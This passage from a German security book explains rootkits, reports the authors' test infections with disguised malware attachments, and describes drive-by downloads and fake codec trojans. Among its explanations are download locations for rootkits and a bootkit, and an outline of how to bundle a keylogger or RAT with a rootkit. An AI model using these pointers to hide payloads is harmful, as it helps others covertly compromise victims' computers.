diese Programme vom Anwender unbemerkt durchtunneln. Die Verwandtschaft zu den Rootkits liegt auf der Hand: Den Angreifern geht es nicht mehr einfach darum, vorhandene Schutzw\u00e4lle aufzubrechen und AV-Scanner abzuschalten. Es geht vielmehr darum, die eigene Anwesenheit auf dem Rechner des Opfers so lang wie m\u00f6glich zu verschleiern.\n17.2 Rootkits\n361\nBild 17.22: An der Firewall vorbei in drei Schritten\n17.2\nRootkits\n\u00dcber kaum eine andere Bedrohung der Computersicherheit wurde in diesem Jahr so h\u00e4ufig berichtet wie \u00fcber Rootkits im Windows-Umfeld. Zur nicht geringen Verunsicherung der PC-User trug auch der Umstand bei, dass manche Audio-CDs (etwa von Sony BMG) und DVDs (z. B. der Spielfilm \u00bbMr. und Mrs. Smith\u00ab mit AlphaDVD-Kopiersperre von Settec Inc.) mit Kopierschutztechniken arbeiteten, deren wesentlicher Bestandteil Rootkit-Technologie war. An sich sind Rootkits ein alter Hut. In der Unix-Welt existieren diese seit Beginn der 90er Jahre und wurden von Hackern als eine Art Hintert\u00fcrprogramm eingesetzt, um nicht nur den Hack zu tarnen, sondern um sich auch in Zukunft auf dem gekaperten System mit administrativen Rechten unbemerkt bewegen zu k\u00f6nnen. Mit einfachen Worten: Ein \u00bbWurzelbaukasten\u00ab (so die w\u00f6rtliche \u00dcbersetzung des Begriffs Rootkit) ist eine raffinierte Tarntechnik, mit der ein Angreifer einen fremden\n362\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nPC \u00fcbernehmen und steuern kann, ohne dass diese Aktivit\u00e4ten vom User bemerkt w\u00fcrden. Diese Tarntechnik eignet sich besonders gut in Kombination mit RATs (Remote Access Tools = Fernsteuerungstools) und Keyloggern, weswegen eine Grenzziehung zwischen Rootkits und Trojanern in der Praxis nicht immer m\u00f6glich ist. Nebenbei bemerkt lassen sich mit Rootkits nat\u00fcrlich auch andere Sch\u00e4dlinge wie z. B. Browserhijacker oder Adware tarnen. Typologisch lassen sich diese anhand ihrer Angriffspunkte grob in zwei Gruppen unterteilen: \u2022\nUserland Rootkits\n\u2022\nKernel Rootkits\nDie Zugriffssteuerung von Betriebssystemen, die auf der Intel-x86-Familie beruhen (Windows und Linux), setzen zur Zugriffssteuerung auf das Prinzip der Ringe, wobei in Ring 0 der gesamte Kernelcode von Windows residiert und Ring 3 (Ring 1 und 2 werden nicht benutzt) reserviert ist f\u00fcr Anwenderprogramme (z. B. Word, Excel, Internet Explorer). Programmcode, der im Ring 0 oder der Kernelebene ausgef\u00fchrt wird, verf\u00fcgt \u00fcber h\u00f6here Privilegien als Code, der im Userland (Ring 3) operiert. Zwischen Ring 0 und Ring 3 existieren Schnittstellen, die von der WinAPI realisiert werden und aus den Bibliotheken Advapi.dll, Gui32.dll, Kernel32.dll und Win32.dll bestehen. Da kein Userland-Programm direkt mit dem Kernel kommunizieren kann, werden alle Kernelaufrufe \u00fcber die WinAPI abgewickelt. Und genau hier liegt der Angriffspunkt der Userland-Rootkits. Stark vereinfacht machen diese nichts anderes, als ihren Programmcode in andere Anwenderprogramme zu injizieren, wo sie dann z. B. \u00fcber die Datei User.dll in den Kernel geladen werden. In der Folge kontrollieren diese Rootkits dann die Kommunikation zwischen Kernel und Userland. Jeder Aufruf des Taskmanagers, des Dateiexplorers oder anderer Programme wird entsprechend gefiltert. Prozesse werden dadurch unsichtbar gemacht, Trojanerports freigegeben oder die Anwesenheit weiterer Malware auf dem Rechner verschleiert. Eines der ersten so funktionierenden Tools ist NTIllusion, das im Phrack Magazine181 Nr. 62 vorgestellt wurde. Nachteil der Userland-Rootkits: Sie sind durch Erkennungsprogramme, die auf Kernelebene mit h\u00f6herem Priviliegenstatus arbeiten, leicht zu erkennen und zu blockieren. Deswegen gehen Rootkitdesigner h\u00e4ufig einen anderen, effektiveren Weg, indem sie Rootkits direkt auf der Kernelebene implementieren. Der Windows-Kernel verf\u00fcgt \u00fcber vier Funktionskomplexe: Prozessverwaltung, Dateizugriffssteuerung, Sicherheit und Speicherverwaltung. Gelingt es dem Rootkit, sich direkt, z. B. getarnt als Ger\u00e4tetreiber im Kernel zu verankern oder zu verhaken (man spricht hier auch von Hooking = Verhaken), kontrolliert er Dateizugriff und Prozessverwaltung und genie\u00dft dadurch absolute Immunit\u00e4t bei der Verfolgung durch MalwareScanner aus dem Userland. Mitunter werden beide Konstruktionsprinzipien auch miteinander kombiniert.\n181\nhttp://www.phrack.com/issues.html?issue=62&id=12#article\n17.2 Rootkits\n363\nBild 17.23: Unterschiedliche Typen von Rootkits\nEin herausragender Vertreter seiner Art ist das Hacker Defender Rootkit, das sich durch Manipulation von Ger\u00e4tetabellen verbirgt, aber f\u00fcr bestimmte Zusatzfunktionen auch einen Ger\u00e4tetreiber im Kernel verankert; ganz nebenbei sind auch noch Keylogger und Backdoor integriert.\n17.2.1 Test-Rootkit Unreal Die neueste Generation von Rootkits wie das FU Rootkit (Nachfolger: FUTo) bringt zus\u00e4tzlich eine neue Technik ins Spiel: die Direct Kernel Object Manipulation (DKOM), womit man Prozesse und Treiber noch besser als durch Hooks oder Implants (Stichwort: DLL-Injection) tarnen kann. Einen \u00e4hnlich interessanten Ansatz verfolgt das russische Test-Rootkit Unreal, der Nachfolger des RK-Demo-Rootkits, das auf http://f13-labs.net/virus.htm heruntergeladen werden kann. Beschreibung der Autoren: Unreal.B will include 1. effective antidetection part for some lamerz antirootkits 2. new method of file hidding, pjf creature will be fucked completely and conceptually. 3. surprise for these guys who loves xor-xor-xor (not malicious!) 4. compatibility with Windows 2000\n364\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nUnreal arbeitet ebenso wie sein Vorg\u00e4nger zweistufig: Im ersten Schritt startet ein Userland-Prozess, dessen einzige Aufgabe es ist, einen bestimmten Kerneltreiber zu laden. Nach dieser Aufgabe verabschiedet sich dieser Prozess aus dem System und verwischt damit die einzige Spur, die das russische Demo-Rootkit \u00fcberhaupt hinterl\u00e4sst. Danach ist es quasi unreal \u2013 nicht mehr vorhanden. Wir haben es getestet.\nBild 17.24: Innovativstes Rootkit aus Russland\nDa kein Antirootkit-Detektor das Tool nach dem heutigen Stand der Technik zuverl\u00e4ssig erkennt, empfehlen die Autoren, dass man sich mit dem Debugviewer182 von Sysinternals den Kernel-Output ansieht. Tats\u00e4chlich: Unreal ist pr\u00e4sent.\nBild 17.25: Rootkitaktivit\u00e4ten mit DebugView \u00fcberwachen\nRichtig be\u00e4ngstigend war aber die Tatsache, dass Zonealarm Pro zwar meldete, dass der Prozess unreal.exe einen neuen Treiber installieren wollte und entsprechend um Einverst\u00e4ndnis ersuchte, dass aber \u2013 unabh\u00e4ngig von der Bewilligung \u2013 der Treiber des Rootkits sich dennoch im System verewigte. Da ist es nur ein geringer Trost, dass es sich nur\n182\nhttp://technet.microsoft.com/en-us/sysinternals/bb896647.aspx\n17.2 Rootkits\n365\num eine Demo handelte, der, bislang wenigstens, jegliche Schadensroutinen (Keylogger, Backdoor) fehlten. Etwas mehr Schaden bzw. praktischen Nutzen bieten andere Rootkits. Einen guten \u00dcberblick \u00fcber die Sch\u00e4dlinge hat man auf den Seiten von www.rootkit.com, wo sich die klassischen Rootkits wie FU Rootkit, Vanquish, AFX, Hacker Defender, HE4Hook oder das NT Rootkit herunterladen lassen. Mehr Rootkits, auch weniger bekannte wie das franz\u00f6sische Agony oder Oddysee gibt es bei JHDSCRIPT183. Die meisten der dort angebotenen Rootkits lassen sich f\u00fcr eigene Versuche verwenden, da sie meist nach dem gleichen Schema arbeiten: \u2022\nBereitstellen des (zus\u00e4tzlichen) Payloads (Keylogger, RATs)\n\u2022\nModifizieren der Dateinamen, damit sie unter dem Schild des Rootkits getarnt sind (z. B. reicht es bei dem Oddysee-Rootkit, den zus\u00e4tzlichen Dateien einen doppelten Unterstrich voranzustellen, damit sie verborgen sind)\n\u2022\nKombinieren mit dem Rootkit \u00fcber einen meist mitgelieferten Binder\n17.2.2 AFX-Rootkit Unser zweites Testexemplar ist das AFX-Rootkit, sozusagen der Routinier in der Szene. Das Kit kommt mit einer guten Betriebsanleitung, in der Funktionsweise, Installation und Deinstallation kurz und knapp beschrieben sind.\nBild 17.26: AFX-Rootkit mit viel Bedienungskomfort\n183\nhttp://www.jhdscript.com/downloadlist.php?cat=3&PHPSESSID=cdffe5b10e4f20afcc2cd8d823763d23\n366\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nNach der Installation ist das Rootkit, das wir mit einer anderen Datei zusammen im Verzeichnis C:\\rootkit gespeichert haben, aus der Verzeichnisstruktur verschwunden. Weder im Taskmanager noch in der Registry noch in der Systemkonfiguration (msconfig.exe) finden sich Spuren von AFX. Auch mit dem viel ger\u00fchmten externen Process Explorer von Sysinternals184 l\u00e4sst sich das installierte Rootkit nicht entdecken. Im Detail: Wird AFX mit root /i initialisiert, greift der Prozess root.exe auf das Client/ Server Runtime Subsystem (csrss.exe) zu, das u. a. die Bibliothek Winsrv.dll. einbindet, wor\u00fcber sich das Rootkit dann dauerhaft \u00fcber seinen Systemtreiber Hook.dll im Kernel verankert. Anschlie\u00dfend verbirgt es seine Anwesenheit und die Aktivit\u00e4ten eventuell mitgereister Sch\u00e4dlinge wie Keylogger. Da Rootkits sehr systemnah programmiert sind, laufen sie auch nur unter bestimmten Betriebssystemvarianten. Fast alle Rootkits zielen auf Rechner ab, auf denen Windows 2000, XP oder NT l\u00e4uft. Windows 98 und ME sind sozusagen auf der sicheren Seite, was den Angriff durch Rootkits betrifft. Das trifft auch auf Windows Vista zu, wenn dort die User Account Control aktiviert ist. Manche Rootkits sind noch w\u00e4hlerischer und verlangen einen bestimmten Service-Level (bei Win XP meist das Service Pack 2), um korrekt funktionieren zu k\u00f6nnen. Nichtsdestotrotz ist es be\u00e4ngstigend, mit welcher Stringenz und welchem Know-how Hacker und Malware-Coder daran arbeiten, PCs zu unterwandern. Auch die Sicherheitsdienste der Bundesrepublik mischen hier munter mit. Zur Terrorismusabwehr soll der Bundesb\u00fcrger mit dem Bundestrojaner \u00bbbegl\u00fcckt\u00ab werden. Wir zitieren aus einer erfrischend frechen und satirischen Webseite gleichen Namens (http://bundestrojaner.zenzizenzizenzic.de/): Der von der Bundesregierung im Zusammenhang mit dem bekannten Softwarehersteller Dodo entwickelte Bundestrojaner bedeutet vor allem f\u00fcr Sie einen nicht zu untersch\u00e4tzenden Gewinn an Sicherheit. Denn der Bundestrojaner \u00fcberwacht Ihren Computer rund um die Uhr und meldet verd\u00e4chtige Dateien sofort an bis zu 37 Sicherheitsbeh\u00f6rden weiter, darunter das Gemeinsame Terrorismusabwehrzentrum (GTAZ) des Bundesinnenministeriums. Der Vorteil f\u00fcr Sie als Computernutzer ist, dass Sie sich dank des Bundestrojaners keine Sorgen mehr um die Sicherheit Ihres Computers oder Ihrer Daten machen m\u00fcssen. Das erledigen nach Download und Installation des Bundestrojaners die deutschen Sicherheitsbeh\u00f6rden f\u00fcr Sie. Sollten alle Stricke rei\u00dfen, dann haben die Sicherheitsbeh\u00f6rden auch ein Back-Up Ihrer Datens\u00e4tze f\u00fcr Sie parat. Sie sehen also, der Bundestrojaner bringt Ihnen nur Vorteile. Z\u00f6gern Sie deshalb nicht, laden Sie noch heute den Bundestrojaner herunter und installieren Sie ihn auf Ihren Festplatten. Ohne Satire konnte man das im Newsticker von Heise185 nachlesen: \u00bbAls Bundestrojaner wird inoffiziell der Teil eines Programms bezeichnet, der Spyware-Code auf einen PC einschleust, damit eine Onlinedurchsuchung durch die Strafverfolgungsbeh\u00f6rden oder Geheimdienste m\u00f6glich ist. Mit anderen Worten: Sowohl von den b\u00f6sen als auch von\n184\nVon Firma Microsoft \u00fcbernommen, alle Tools k\u00f6nnen von dort: http://technet.microsoft.com/dede/sysinternals/default.aspx heruntergeladen werden\n185\nhttp://www.heise.de/newsticker/meldung/83538\n17.3 Die Infektion\n367\nden braven Buben droht dem User Ungemach. Profitieren werden davon wieder die Anbieter einschl\u00e4giger Sicherheitsprodukte sowie dubiose Kreise, die den Bundestrojaner f\u00fcr ihre Zwecke instrumentalisieren werden. Eine diesbez\u00fcgliche Steilvorlage f\u00fcr Malware-Coder hat Sony mit seinem Rootkit bereits geliefert. Abschlie\u00dfend noch ein Hinweis auf eine andere Art von Trojanern, mit denen MailAttachements h\u00e4ufig verseucht sind: den Trojan Droppern oder Trojan Downloadern. Es handelt sich dabei um ein eigenst\u00e4ndiges Programm (vgl. unsere Tools-Sektion), das genau eine Aufgabe wahrnimmt: neue Malware nachzuladen und zu installieren. Vorteil aus Sicht des Angreifers: Trojan Dropper sind oft nur wenige Kilobyte gro\u00df, lassen sich gut verstecken und durch die Maschen von AV-Scannern schleusen. Insbesondere aber k\u00f6nnen die neuesten und funktionst\u00fcchtigsten Sch\u00e4dlinge nachgeladen werden. Ein gutes Beispiel daf\u00fcr ist das Bootkit Stoned, das in der Lage ist, auch via Truecrypt vollverschl\u00fcsselte Festplatten anzugreifen (vgl. www.heise.de/newsticker/meldung/Bootkithebelt-Festplattenverschluesselung-aus-748859.html). Am elegantesten funktioniert das mit einem PDF-Infector (genaues, zum Nachmachen bestimmtes Procedere unter: www.stoned-vienna.com. Als Infektor dient ein Trojaner-Downloader, der in einer PDFDatei integriert ist. Wird die PDF-Datei ge\u00f6ffnet, l\u00e4dt der Infektor das Stoned-Bootkit \u2013 eventuell noch in Kombination mit beliebigem anderen Payload). Dieses verankert sich im Master Boot Record und wird bei jedem Start als Kerneltreiber automatisch im Hintergrund mitgeladen. Dem Spuk kann allerdings mit dem Befehl fixmbr (Windows Reparatur Konsole) ein rasches Ende gesetzt werden. Das Rootkit kann unter www.darknet.org.uk/2009/08/stoned-bootkit-windows-xp-2003-vista-7-mbr-rootkit/ heruntergeladen werden (Framework + Infector.exe).\n17.3\nDie Infektion\nDie folgenden Experimente sind nur bedingt zur Nachahmung empfohlen. Der Grund? Sie k\u00f6nnen damit Ihr System ziemlich effektiv ruinieren, da Sie mit unbekannten Sch\u00e4dlingen experimentieren, von denen Sie nicht genau wissen, was sie alles manipulieren. Am Ende hilft dann nur noch das Formatieren, wobei Sie hoffentlich vorher eine komplette Datensicherung erstellt haben. Wir empfehlen, solche Versuche entweder auf einer virtuellen Maschine ablaufen zu lassen oder auf einem separaten Test-PC zu starten. Andere Ma\u00dfnamen entnehmen Sie bitte dem Unterkapitel \u00bbSchutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\u00ab. Sollten wir Sie trotzdem nicht vom Experimentieren abhalten k\u00f6nnen, haben wir noch drei spezielle Softwaretipps: 1. ERUNT \u2013 Backup der Registry Die Freeware ERUNT186, mit der man einmalig oder regelm\u00e4\u00dfig Sicherungen aller Registry-Dateien von Win NT, XP und Vista anlegen kann. Da abgesehen von den Bootviren so gut wie jeder Sch\u00e4dling einen Autostarteintrag in der Registry vornehmen muss, um den n\u00e4chsten Bootvorgang zu \u00fcberleben, kann man Malware relativ einfach au\u00dfer Gefecht setzen, wenn man die letzte malwarefreie Registry zur\u00fccksi-\n186\nhttp://www.larshederer.homepage.t-online.de/erunt\n368\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nchert. Die Sch\u00e4dlinge sind zwar nach wie vor auf der Platte vorhanden, aber deaktiviert. 2. Drive Snapshot Ein kleines, effizientes und schnelles Image-Backupprogramm wie Drive Snapshot187 (39 \u20ac), mit dem man unkompliziert infizierte Partitionen zur\u00fccksetzen kann. Gro\u00dfer Vorteil des nur 3 MB umfassenden Drive Snapshot: Es startet ohne vorherige Installationsroutine und sichert Partitionen im laufenden Betrieb. 3. WINcon 6.0188 Ein kostenloses \u00dcberwachungstool, mit dem man allen Systemver\u00e4nderungen auf die Spur kommen kann, die durch eine Malware-Attacke verursacht wurden.\n17.3.1 Experiment 1: Rechnung.pdf.exe Im ersten Experiment starteten wir die Datei rechnung.pdf.exe, die angeblich eine Telekomrechnung enth\u00e4lt. Um die Systemver\u00e4nderungen zu dokumentieren, erstellten wir zuvor mit WINcon einen Schnappschuss unseres sauberen Systems. Danach klickten wir auf die omin\u00f6se Exe-Datei.\nBild 17.27: Start der rechnung.pdf.exe\nDie Fehlermeldung ist recht geschickt gew\u00e4hlt. Scheinbar gibt es ein Problem mit dem Acrobat Reader \u2013 so zumindest denkt der unbedarfte Anwender. In Wirklichkeit starteten diverse Malware-Routinen. Da die Rechner-Firewall aktiv war, bekamen wir im Einzelnen mit, was sich tat.\n187\nhttp://www.drivesnapshot.de/de/index.htm\n188\nhttp://www.bexlab.com\n17.3 Die Infektion\n369\nBild 17.28: Der Sch\u00e4dling verankert sich im System\nF\u00fcr das Experiment erlaubten wir die jeweiligen Aktionen. Danach starteten wir WINcon erneut, um das System auf die Ver\u00e4nderungen hin zu untersuchen. Es tat sich eine ganze Menge:\nBild 17.29: Mit WINcon den Ver\u00e4nderungen auf der Spur\n370\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nEinige Dateien wurden gel\u00f6scht, z. B. der urspr\u00fcngliche Sch\u00e4dling rechnung.pdf.exe, und leider auch eine DLL-Datei, die Mozilla Firefox zum Starten ben\u00f6tigte \u2013 woraufhin nur noch der Internet Explorer funktionierte. Andere Dateien wie die schon unr\u00fchmlich aufgefallene adsndsd.exe verewigten sich im Systemordner von Windows. Es ist gerade f\u00fcr Neulinge nicht so einfach, die vielen Eintr\u00e4ge, die WINcon liefert, ad\u00e4quat einzusch\u00e4tzen. Sobald Rootkits ins Spiel kommen und WINcon auf dem infizierten System gestartet wird, kann man sich auf die Ergebnisse nur noch bedingt verlassen, da Kernel-Rootkits nat\u00fcrlich in der Lage sind, die Scanergebnisse von WINcon zu verf\u00e4lschen. Um auf der sicheren Seite zu sein, booteten wir unser System mit einer zweiten Platte und \u00fcberpr\u00fcften die infizierte Partition mit zwei klassischen Malware-Scannern. Das Ergebnis war dann auch keine gro\u00dfe \u00dcberraschung \u2013 es deckt sich weitgehend mit den Befunden, die WINcon liefert. Etwas \u00fcberrascht waren wir dann aber trotzdem: Abgesehen von einem au\u00dfer Kraft gesetzten Mozilla Firefox und einem nicht weiter aktiven Sch\u00e4dling im Systemverzeichnis geschah nichts. Unsere Vermutung geht in Richtung Zonealarm. Da diese Firewall \u00fcber einen Kernelmode-Treiber verf\u00fcgt, der auch im Hintergrund Systemver\u00e4nderungen verhindert, hat sich zumindest dieser Sch\u00e4dling nicht weiter verbreiten k\u00f6nnen.\n17.3.2 Experiment 2: bild-07_jpg.com Im zweiten Versuch testeten wir eine Datei mit dem vielversprechenden Namen bild07__jpg.com, die sich Ende November 2006 zusammen mit folgender Mail auf unsere Platte verirrte: Hi Miriam, langsam wird\u2019s eng, in zwei Monaten l\u00e4uft mein Arbeitslosengeld aus und ich bekomme Hartz IV \u2013 darf gar nicht daran denken, deswegen komme ich auf Dein Angebot zur\u00fcck, (Attraktives Girl f\u00fcr Escort und Begleitung ...). Also Tages -und Abendfreizeit ist bei mir vorhanden, w\u00fcrde gern mit Dir zusammen arbeiten. Hauptsache, der Verdienst stimmt. Als Anlage ein freiz\u00fcgiges Foto von mir f\u00fcr die Kundenkartei. Ich hoffe auf Deine Diskretion und freue mich auf Antwort. LG, Kimberly Da die Datei mit 253 KB ein wahres Malware-Schwergewicht ist, waren wir gespannt, was sich hier tun w\u00fcrde. Um etwas intensiver die Verbindungsversuche zu dokumentieren, installierten wir den Port Explorer189. Das Tool erlaubt ein Port-to-ProcessMapping, d. h., es zeigt alle offenen und versteckten TCP- und UDP-Ports an, die einem laufenden Prozess zugeordnet sind. Auch kann man sich mit dem eingebauten PacketSniffer die \u00fcbermittelten Daten anschauen. Nach dem Anklicken \u00f6ffnete sich zuerst ein leeres Command-Fenster, danach zeigte sich eine z\u00fcchtig bekleidete Dame in schlechter Aufl\u00f6sung. 189\nhttp://www.diamondcs.com.au/portexplorer\n17.3 Die Infektion\n371\nBild 17.30: Schlecht aufgel\u00f6ste Tarnung des Trojaners\nIm Hintergrund schritt die Infektion munter fort. Neue Dateien wurden heruntergeladen, nahmen Kontakt auf ins Internet und versuchten, sich in der Registry zu verankern.\n372\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.31: Trojanerroutine(n)\nNat\u00fcrlich waren wir sehr gespannt, was die Quelle des freiz\u00fcgigen Spenders dieser Malware betrifft, aus diesem Grund lie\u00dfen wir den Port Explorer im Hintergrund mitlaufen.\nBild 17.32: Dem T\u00e4ter auf der Spur\nEines der Programme, die Datei dc.exe, nahm Kontakt auf zur Seite 83.129.8.235 \u2013 eine Seite, die bei Tiscali Online (Deutschland) registriert ist. Gab man die Adresse im Browser ein, erschien die lapidare Meldung, dass hier gerade erfolgreich ein ApacheServer installiert wurde. Witzigerweise verschwand die Seite einen Tag nach unserem Test. Was kann man als betroffener User jetzt tun? Nun, die Sache gestaltet sich, da der\n17.4 Drive-by-Downloads\n373\nTrojanerfreak aus Deutschland zu stammen scheint, recht einfach. \u00dcber eine WhoisAbfrage bekommt man nicht nur den ISP, sondern auch eine E-Mail-Adresse heraus:\n[[email protected]](/cdn-cgi/l/email-protection)\n. Wir haben hier unsere Protokolle hingeschickt und warten gespannt auf eine Antwort. Unsere Vermutung: Hier hat sich ein eher unbedarftes Script-Kiddie einen \u00fcblen Scherz erlauben wollen. Da die Seite bislang noch nicht aus dem Verkehr gezogen wurde, tippe ich darauf, dass die Mail vermutlich gezielt plaziert wurde.\n17.4\nDrive-by-Downloads\nEine Malware-Infektion kommt nicht nur \u00fcber entsprechende Attachments zustande, sondern fast ebenso h\u00e4ufig kann sich ein Anwender beim Besuchen einer (un)bekannten Webseite einen Sch\u00e4dling einfangen. Technisch betrachtet kommen daf\u00fcr zwei M\u00f6glichkeiten in Betracht. Die erste M\u00f6glichkeit setzt auf Sicherheitsl\u00fccken in Webbrowsern, indem diesem speziell pr\u00e4parierte Webseiten angeboten werden, die z. B. einen Buffer-Overflow im Browser ausl\u00f6sen, wodurch dann beliebiger Shellcode auf dem Opfer-PC ausgef\u00fchrt wird. Man nennt diese Angriffstechnik auch Remote-Code-Execution-Attacks. Die Anf\u00e4lligkeit gegen\u00fcber solchen Attacken basiert h\u00e4ufig auf mobilem Code in Form von ActiveX-, Java oder JavaScript, ohne die eine Webseite selten in ihrer vollen Funktionalit\u00e4t betrachtet werden kann. Hin und wieder erreichen mich Mails mit folgendem Aufh\u00e4nger:\nBild 17.33: Einladung zum Drive-by Download\nDer Inhalt der Mail besteht dann in nichts anderem als dem ber\u00fcchtigten Link, in unserem Fall: www.coldspread.de. F\u00fcr kurze Zeit ist dann die gekaperte Webseite der Band gleichen Namens zu erreichen. In Abh\u00e4ngigkeit davon, ob Skripts aktiviert oder deaktiviert sind, erfolgt dann die Infektion durch einen Trojandownloader (in unserem Fall durch Nurech). Einen Tag sp\u00e4ter ist die Seite meistens abgeschaltet, der Zugriff darauf verboten oder sonstwie nicht zu erreichen, da die urspr\u00fcnglichen Seitenbetreiber vermutlich alle H\u00e4nde voll zu tun haben, ihre urspr\u00fcngliche Webseite wiederherzustellen und die Sicherheitsl\u00fccken zu stopfen. Die zweite M\u00f6glichkeit besteht darin, den Surfer dazu zu verleiten, mit einem Klick ein f\u00fcr ihn kostenloses Angebot zu akzeptieren oder sich offiziell ein Programm, einen neuen Codec etc. herunterzuladen. Eine ganze Branche nutzt diese Masche \u2013 die Advertiser oder, vornehmer ausgedr\u00fcckt, Firmen, die mit Online-Marketing ihr Geld verdienen. An vorderster Front stehen hier Firmen wie iframeCash.biz oder iframeDollar.biz. Ihr Gesch\u00e4ftsmodell hat zwei Seiten: Wer eine Webseite hat und damit Geld verdienen m\u00f6chte, r\u00fcstet diese mit einigen Zeilen Code dieser Firmen aus. Ruft ein Anwender jetzt diese Seite auf, installieren sich im Hintergrund ungefragt etliche Programme, die in der Folge seinen Browser umleiten, Suchergebnisse verf\u00e4lschen und ihn ungefragt mit Werbeeinblendungen jeglicher Art \u00fcberschwemmen. Pro 1.000 (unfreiwilliger) Userinstallationen zahlt iframeCash.biz 80 US-Dollar. Nach einem \u00e4hnlichen Konzept agiert MediaTickets:\n374\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.34: Malworker at Business\nDem User, der nichtsahnend einem scheinbar interessanten und f\u00fcr ihn kostenlosen Angebot folgt und klickt, passiert Folgendes: Auf seiner Platte starten zwei Prozesse: arsetup.exe und installer.exe, die auf die ebenfalls neu heruntergeladene Systembibliothek MediaTicketsInstaller.ocx zugreifen. Weiterhin wird die Registry um entsprechende Starteintr\u00e4ge erg\u00e4nzt. HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\msn messanger HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\regrun HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\propro HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\MEDIATICKETSINSTALLER. MediaTicketsInstallerCtrl.1 HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{39DA2444-065F-47CB-B27CCCB1A39C06B7} HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{9EB320CE-BE1D-4304-A0814B4665414BEF} HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{3517FB25-305D-4012-B531186E3851E7ED} HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{4781DAA6-4DE5-47A1-B02A945F0D017A9E} HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\TypeLib\\{5530D356-0063-41B9-B20DE9D799E8D907} HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Code Store Database\\Distribution Units\\{9EB320CE-BE1D-4304-A081-4B4665414BEF} HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ModuleUsage\\ %Windir%/Downloaded Program Files/MediaTicketsInstaller.ocx\nSobald Windows neu startet, werden die Werbeeinblendungen aktiv, und damit dies auch im Browser korrekt angezeigt wird, manipulieren diese Dateien auch noch die Sicherheitseinstellung des Internet Explorers.\n17.4 Drive-by-Downloads\n375\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\CurrentLevel HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\Flags\nF\u00fcr derartige Scherze ist leider der Internet Explorer von Microsoft extrem anf\u00e4llig. Bei Opera sowie Mozilla Firefox, die auf den Einsatz von Active X g\u00e4nzlich verzichten, sind die H\u00fcrden f\u00fcr derlei Sch\u00e4dlinge entschieden h\u00f6her. Der Surfer muss hier in jedem Fall explizit zustimmen, wenn eine Webseite ihm irgendwelche dubiose Toolbars etc. unterjubeln m\u00f6chte. Wer sich etwas n\u00e4her \u00fcber die Nutzung von Exploits und Advertising informieren m\u00f6chte, dem sei die sehr informative Seite von www.benedelman.org empfohlen. Einer der ber\u00fcchtigtsten Exploits, mit dessen Hilfe ahnungslosen Surfern nicht nur Adware, sondern auch Trojaner inklusive Keylogger und Backdoors untergeschoben wurden, ist der WMF-Exploit, der zwischen der Jahreswende 2005/2006 die Internetszene ziemlich verunsicherte, bis Microsoft Ende Januar 2006 einen Patch herausbrachte. Der Exploit nutzt eine Schwachstelle im Windows Picture and Fax Viewer. Wird eine solcherma\u00dfen pr\u00e4parierte Seite im Internet Explorer geladen, erfolgt die Infektion automatisch: Der IE erkennt auf der fraglichen Seite eine Vektorgrafik (WMF-Datei) und aktiviert dann das Viewer-Modul, das den Shellcode ausf\u00fchrt. Mozilla Firefox-Anwender hatten hier bessere Chancen, denn hier fragte der Browser, ob die WMF-Datei gespeichert und auf der lokalen Platte angezeigt bzw. ausgef\u00fchrt werden sollte. Anhand des in unserer Tools-Sektion vorgestellten WMF-Makers kann man die Arbeitsweise der Angreifer nachvollziehen. Der Exploit an sich ist harmlos; mit dem Baukasten kann man aber steuern, welche Datei der Picture Viewer versteckt ausf\u00fchren soll. In der Regel bindet man hier einen Trojan Dropper ein, der dann auf das Zielsystem weiteren Schadcode (Adware, Spyware etc.) platziert. Kein Drive-by-Download, aber dennoch ein heimt\u00fcckischer Angriff auf die Gutgl\u00e4ubigkeit von Internet-Usern erlebt man beim Besuch der Seite www.zcodec.com. V\u00f6llig dreist wird man aufgefordert, sich einen neuen, qualitativ besseren Videocodec herunterzuladen. Auch wenn die Seite nicht mehr funktioniert, es gibt jede Menge Nachahmer, wie z. B. den Trojaner Zlob, vicodes, vidcodec, vcodec oder xxx-codec, und fast immer handelt es sich um den gleichen angeblichen Videocodec. Eine verwandte Masche kann man auf etlichen Sexseiten bewundern. Bevor man dort aber irgendetwas sehen kann, poppt ein Fenster mit einschl\u00e4gigem Inhalt auf:\n376\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.35: Ein Angebot, das man besser ausschl\u00e4gt\nBild 17.36: Trojaner getarnt als Videocodec\n17.4 Drive-by-Downloads\n377\nDieser Codec ist ein klassisches Trojanisches Pferd, das auf dem Rechner eine Backdoor einrichtet, die dem Angreifer T\u00fcr und Tor \u00f6ffnet. Obwohl sich in unserem Experiment keine weitere Sypware installierte, gelang es dem Sch\u00e4dling doch, auf Port 53 eine Verbindung zu einem Rechner in der Ukraine herzustellen.\nBild 17.37: Backdoor in die Ukraine\nNicht mehr zum Thema \u00bbDrive-by-Downloads\u00ab, sondern eher ins Kapitel \u00bbDriven by Ignorance\u00ab geh\u00f6ren Malware-Downloads \u00fcber verseuchte Dateien \u2013 im Grunde eine Parallele zu den Mailanh\u00e4ngen. Wer 